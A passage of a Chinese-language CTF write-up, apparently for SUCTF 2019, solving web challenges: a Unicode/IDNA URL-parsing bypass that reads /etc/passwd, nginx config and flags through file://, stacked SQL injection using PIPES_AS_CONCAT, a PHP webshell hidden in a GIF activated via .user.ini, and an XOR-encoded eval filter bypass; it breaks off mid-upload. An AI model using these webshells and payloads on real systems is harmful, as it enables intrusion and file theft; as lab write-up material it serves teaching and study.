class=\"keyword\">and</span> url[:<span class=\"number\">1</span>] != <span class=\"string\">'/'</span>: url = <span class=\"string\">'/'</span> + url</span><br><span class=\"line\">        url = <span class=\"string\">'//'</span> + (netloc <span class=\"keyword\">or</span> <span class=\"string\">''</span>) + url</span><br><span class=\"line\">    <span class=\"keyword\">if</span> scheme:</span><br><span class=\"line\">        url = scheme + <span class=\"string\">':'</span> + url</span><br><span class=\"line\">    <span class=\"keyword\">if</span> query:</span><br><span class=\"line\">        url = url + <span class=\"string\">'?'</span> + query</span><br><span class=\"line\">    <span class=\"keyword\">if</span> fragment:</span><br><span class=\"line\">        url = url + <span class=\"string\">'#'</span> + fragment</span><br><span class=\"line\">    <span class=\"keyword\">return</span> _coerce_result(url)</span><br></pre></td></tr></table></figure>\n\n<p>这个函数的作用就是如果截取的URL（也就是path的位置）包含//就不再处理path。</p>\n<p>也就是<code>scheme:////netloc/path;parameters?query#fragment</code>经过urlsplite处理后会变成</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scheme&#x3D;&#39;scheme&#39;, netloc&#x3D;&#39;&#39;, path&#x3D;&#39;&#x2F;&#x2F;netloc&#x2F;path;parameters&#39;, query&#x3D;&#39;query&#39;, fragment&#x3D;&#39;fragment&#39;</span><br></pre></td></tr></table></figure>\n\n<p>再经过urlunsplit处理后会变成</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scheme:&#x2F;&#x2F;netloc&#x2F;path;parameters?query#fragment</span><br></pre></td></tr></table></figure>\n\n<p>如果传入的url是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.cc&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>\n\n<p>会返回主机的用户记录</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root:*:17647:0:99999:7:::</span><br><span class=\"line\">daemon:*:17647:0:99999:7:::</span><br><span class=\"line\">bin:*:17647:0:99999:7:::</span><br><span class=\"line\">sys:*:17647:0:99999:7:::</span><br><span class=\"line\">sync:*:17647:0:99999:7:::</span><br><span class=\"line\">games:*:17647:0:99999:7:::</span><br><span class=\"line\">man:*:17647:0:99999:7:::</span><br><span class=\"line\">lp:*:17647:0:99999:7:::</span><br><span class=\"line\">mail:*:17647:0:99999:7:::</span><br><span class=\"line\">news:*:17647:0:99999:7:::</span><br><span class=\"line\">uucp:*:17647:0:99999:7:::</span><br><span class=\"line\">proxy:*:17647:0:99999:7:::</span><br><span class=\"line\">www-data:*:17647:0:99999:7:::</span><br><span class=\"line\">backup:*:17647:0:99999:7:::</span><br><span class=\"line\">list:*:17647:0:99999:7:::</span><br><span class=\"line\">irc:*:17647:0:99999:7:::</span><br><span class=\"line\">gnats:*:17647:0:99999:7:::</span><br><span class=\"line\">nobody:*:17647:0:99999:7:::</span><br><span class=\"line\">_apt:*:17647:0:99999:7:::</span><br><span class=\"line\">nginx:!:17708:0:99999:7:::</span><br></pre></td></tr></table></figure>\n\n<p>查看配置文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">getUrl?url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.cc&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pic/66\" alt=\"\"></p>\n<p>查看网站配置文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">getUrl?url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.cc&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen 80;</span><br><span class=\"line\">    location &#x2F; &#123;</span><br><span class=\"line\">        try_files $uri @app;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    location @app &#123;</span><br><span class=\"line\">        include uwsgi_params;</span><br><span class=\"line\">        uwsgi_pass unix:&#x2F;&#x2F;&#x2F;tmp&#x2F;uwsgi.sock;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    location &#x2F;static &#123;</span><br><span class=\"line\">        alias &#x2F;app&#x2F;static;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    # location &#x2F;flag &#123;</span><br><span class=\"line\">    #     alias &#x2F;usr&#x2F;fffffflag;</span><br><span class=\"line\">    # &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>提示flag再 /usr/fffffflag 中</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">getUrl?url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.cc&#x2F;usr&#x2F;fffffflag</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;b692ca82-8292-4582-846a-286b3743f697&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>预期解</strong><br>black hat 上的所展示的部分字符<br><img src=\"/pic/69.png\" alt=\"\"></p>\n<p>Altman师傅写的脚本</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># coding:utf-8 </span><br><span class=\"line\">for i in range(128,65537):    </span><br><span class=\"line\">    tmp&#x3D;chr(i)    </span><br><span class=\"line\">    try:        </span><br><span class=\"line\">        res &#x3D; tmp.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;)        </span><br><span class=\"line\">        if(&quot;-&quot;) in res:            </span><br><span class=\"line\">            continue        </span><br><span class=\"line\">        print(&quot;U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; &quot;.format(tmp, res, i))    </span><br><span class=\"line\">    except:        </span><br><span class=\"line\">        pass</span><br></pre></td></tr></table></figure>\n\n\n<p>可以使用<strong>U+2102，ℂ</strong>代替c，或者<strong>U+2106, ℆</strong>代替c/u</p>\n<p>读取网站配置文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">getUrl?url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.ℂℂ&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br><span class=\"line\">或者</span><br><span class=\"line\">getUrl?url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.c℆usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br></pre></td></tr></table></figure>\n\n<p>读取flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;getUrl?url&#x3D;file:&#x2F;&#x2F;suctf.cℂ&#x2F;usr&#x2F;fffffflag</span><br><span class=\"line\">或者</span><br><span class=\"line\">getUrl?url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.c℆usr&#x2F;fffffflag</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"EasySQL\"><a href=\"#EasySQL\" class=\"headerlink\" title=\"EasySQL\"></a>EasySQL</h2><p>拿到题目是一个输入框，post类型提交</p>\n<p>先fuzz一遍，以下关键字被过滤</p>\n<p><img src=\"/pic/68.png\" alt=\"\"></p>\n<p><strong>非预期解</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*,1</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Array ( [0] &#x3D;&gt; flag&#123;36c7b843-6efb-409d-a1fe-3ef54fce7d6d&#125; [1] &#x3D;&gt; 1 )</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>预期解</strong></p>\n<p>根据测试发现输入长度最大为40个字符</p>\n<p>还发现存在堆叠注入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1;show databases;#</span><br><span class=\"line\"> </span><br><span class=\"line\">Array ( [0] &#x3D;&gt; 1 ) Array ( [0] &#x3D;&gt; ctf ) Array ( [0] &#x3D;&gt; ctftraining ) Array ( [0] &#x3D;&gt; information_schema ) Array ( [0] &#x3D;&gt; mysql ) Array ( [0] &#x3D;&gt; performance_schema ) Array ( [0] &#x3D;&gt; test )</span><br></pre></td></tr></table></figure>\n\n<p>经过测试查询语句应该类似于</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select $_POST[&#39;query&#39;] || flag ...</span><br></pre></td></tr></table></figure>\n\n<p>关于<a href=\"https://mariadb.com/kb/en/sql-mode/\" target=\"_blank\" rel=\"noopener\">sql_mod</a></p>\n<p>当设置sql_mode=<strong>PIPES_AS_CONCAT</strong>时，将”||”视为字符串的连接操作符而非或运算符，这和 Oracle 数据库是一样的，也和字符串的拼接函数 Concat 相类似</p>\n<p>所以payload为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure>\n\n<p>返结果为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Array ( [0] &#x3D;&gt; 1 ) Array ( [0] &#x3D;&gt; 1flag&#123;36c7b843-6efb-409d-a1fe-3ef54fce7d6d&#125; )</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"CheckIn\"><a href=\"#CheckIn\" class=\"headerlink\" title=\"CheckIn\"></a>CheckIn</h2><p>先直接上传图片马，提示文件内容包含<code>&lt;?</code>，采用js的写法绕过</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script language=<span class=\"string\">\"php\"</span>&gt; </span><br><span class=\"line\"><span class=\"built_in\">eval</span>($_POST[cmd]);</span><br><span class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>改后缀为PHP、PHP2、PHP3、PHP4、PHP5、Phtml，发现都被过滤</p>\n<p>php有一个文件是<a href=\"https://www.php.net/manual/zh/configuration.file.per-user.php\" target=\"_blank\" rel=\"noopener\">.user.ini</a>    <a href=\"[https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html](https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html)\">参考连接</a></p>\n<p><img src=\"/pic/70\" alt=\"\"></p>\n<p>先上传一个图片马</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">Content-Disposition</span>: form-data; name=\"fileUpload\"; filename=\"1.gif\"</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: image/gif</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">GIF89a</span></span><br><span class=\"line\">&lt;script language=\"php\"&gt; </span><br><span class=\"line\"><span class=\"attribute\">eval($_POST[cmd]);</span></span><br><span class=\"line\"><span class=\"attribute\">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>上传.htaccess发现没有生效，然后上传.user.ini</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-Disposition: form-data; name&#x3D;&quot;fileUpload&quot;; filename&#x3D;&quot;1.gif&quot;</span><br><span class=\"line\">Content-Type: image&#x2F;gif</span><br><span class=\"line\"></span><br><span class=\"line\">GIF89a</span><br><span class=\"line\">auto_prepend_file&#x3D;1.gif</span><br></pre></td></tr></table></figure>\n\n<p>auto_prepend_file=1.gif  相当于文件夹下所有文件都包含1.gif</p>\n<p>返回信息</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"en\"</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">\"viewport\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"width=device-width, initial-scale=1.0\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">\"X-UA-Compatible\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"ie=edge\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Upload Labs<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>Upload Labs<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"index.php\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"post\"</span> <span class=\"attr\">enctype</span>=<span class=\"string\">\"multipart/form-data\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">label</span> <span class=\"attr\">for</span>=<span class=\"string\">\"file\"</span>&gt;</span>文件名：<span class=\"tag\">&lt;/<span class=\"name\">label</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"file\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"fileUpload\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"file\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"upload\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"提交\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">Your dir uploads/2c67ca1eaeadbdc1868d67003072b481 <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span>Your files : <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span>array(5) &#123;</span><br><span class=\"line\">  [0]=&gt;</span><br><span class=\"line\">  string(1) \".\"</span><br><span class=\"line\">  [1]=&gt;</span><br><span class=\"line\">  string(2) \"..\"</span><br><span class=\"line\">  [2]=&gt;</span><br><span class=\"line\">  string(9) \".user.ini\"</span><br><span class=\"line\">  [3]=&gt;</span><br><span class=\"line\">  string(5) \"1.gif\"</span><br><span class=\"line\">  [4]=&gt;</span><br><span class=\"line\">  string(9) \"index.php\"</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>使用蚁剑连接<code>host/uploads/2c67ca1eaeadbdc1868d67003072b481/index.php</code>即可</p>\n<p><img src=\"/pic/71.png\" alt=\"\"></p>\n<h2 id=\"EasyWeb\"><a href=\"#EasyWeb\" class=\"headerlink\" title=\"EasyWeb\"></a>EasyWeb</h2><p>打开题目就是源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_the_flag</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class=\"line\">    $userdir = <span class=\"string\">\"upload/tmp_\"</span>.md5($_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!file_exists($userdir))&#123;</span><br><span class=\"line\">    mkdir($userdir);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($_FILES[<span class=\"string\">\"file\"</span>]))&#123;</span><br><span class=\"line\">        $tmp_name = $_FILES[<span class=\"string\">\"file\"</span>][<span class=\"string\">\"tmp_name\"</span>];</span><br><span class=\"line\">        $name = $_FILES[<span class=\"string\">\"file\"</span>][<span class=\"string\">\"name\"</span>];</span><br><span class=\"line\">        $extension = substr($name, strrpos($name,<span class=\"string\">\".\"</span>)+<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/ph/i\"</span>,$extension)) <span class=\"keyword\">die</span>(<span class=\"string\">\"^_^\"</span>); </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(mb_strpos(file_get_contents($tmp_name), <span class=\"string\">'&lt;?'</span>)!==<span class=\"keyword\">False</span>) <span class=\"keyword\">die</span>(<span class=\"string\">\"^_^\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!exif_imagetype($tmp_name)) <span class=\"keyword\">die</span>(<span class=\"string\">\"^_^\"</span>); </span><br><span class=\"line\">        $path= $userdir.<span class=\"string\">\"/\"</span>.$name;</span><br><span class=\"line\">        @move_uploaded_file($tmp_name, $path);</span><br><span class=\"line\">        print_r($path);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$hhh = @$_GET[<span class=\"string\">'_'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!$hhh)&#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(strlen($hhh)&gt;<span class=\"number\">18</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'One inch long, one inch strong!'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> ( preg_match(<span class=\"string\">'/[\\x00- 0-9A-Za-z\\'\"\\`~_&amp;.,|=[\\x7F]+/i'</span>, $hhh) )</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Try something else!'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">$character_type = count_chars($hhh, <span class=\"number\">3</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(strlen($character_type)&gt;<span class=\"number\">12</span>) <span class=\"keyword\">die</span>(<span class=\"string\">\"Almost there!\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">eval</span>($hhh);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>首先要绕过长度，然后是绕过正则。</p>\n<p>绕过长度可以新建一个变量，可以使用异或或者非运算绕过。（~操作要比异或简单，但是被禁用，可以使用异或运算模拟非运算）</p>\n<p>异或构造$<em>GET[‘\\</em>‘]</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo urlencode(urldecode(&quot;%ff%ff%ff%ff&quot;)^&quot;_GET&quot;); &#x2F;&#x2F;%A0%B8%BA%AB</span><br></pre></td></tr></table></figure>\n\n<p>payload：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?_&#x3D;$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo</span><br></pre></td></tr></table></figure>\n\n<p>查看phpinfo禁用了如下函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail</span><br></pre></td></tr></table></figure>\n\n<p>还设置了<code>open_basedir</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">open_basedir\t&#x2F;var&#x2F;www&#x2F;html&#x2F;:&#x2F;tmp&#x2F;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_the_flag</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class=\"line\">    $userdir = <span class=\"string\">\"upload/tmp_\"</span>.md5($_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!file_exists($userdir))&#123;</span><br><span class=\"line\">    mkdir($userdir);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($_FILES[<span class=\"string\">\"file\"</span>]))&#123;</span><br><span class=\"line\">        $tmp_name = $_FILES[<span class=\"string\">\"file\"</span>][<span class=\"string\">\"tmp_name\"</span>];</span><br><span class=\"line\">        $name = $_FILES[<span class=\"string\">\"file\"</span>][<span class=\"string\">\"name\"</span>];</span><br><span class=\"line\">        $extension = substr($name, strrpos($name,<span class=\"string\">\".\"</span>)+<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/ph/i\"</span>,$extension)) <span class=\"keyword\">die</span>(<span class=\"string\">\"^_^\"</span>); </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(mb_strpos(file_get_contents($tmp_name), <span class=\"string\">'&lt;?'</span>)!==<span class=\"keyword\">False</span>) <span class=\"keyword\">die</span>(<span class=\"string\">\"^_^\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!exif_imagetype($tmp_name)) <span class=\"keyword\">die</span>(<span class=\"string\">\"^_^\"</span>); </span><br><span class=\"line\">        $path= $userdir.<span class=\"string\">\"/\"</span>.$name;</span><br><span class=\"line\">        @move_uploaded_file($tmp_name, $path);</span><br><span class=\"line\">        print_r($path);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>strrpos(要被检查的字符串,要搜索的字符串) :返回文件最后出现的位置</p>\n<p>mb_strpos(要被检查的字符串,要搜索的字符串)：返回要查找的字符串在别一个字符串中首次出现的位置</p>\n<p>此函数大致意思是文件内容不能包含&lt;?，上传的文件要经过exif_imagetype（）检测</p>\n<p>使用payload上传文件</p>\n<figure class=\"highlight plain\"><table><tr><td 